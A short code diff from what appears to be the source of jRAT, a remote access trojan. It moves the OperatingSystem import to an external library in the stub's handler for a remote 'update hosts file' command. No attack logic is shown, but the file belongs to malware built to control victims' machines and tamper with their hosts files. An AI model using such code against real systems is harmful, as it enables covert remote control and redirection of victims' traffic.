@@ -3,9 +3,10 @@ package se.jrat.stub.packets.incoming;
 import java.io.File;
 import java.io.FileWriter;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.Connection;
 import se.jrat.stub.packets.outgoing.Packet39HostEditResult;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 public class Packet56UpdateHostsFile extends AbstractIncomingPacket {
 
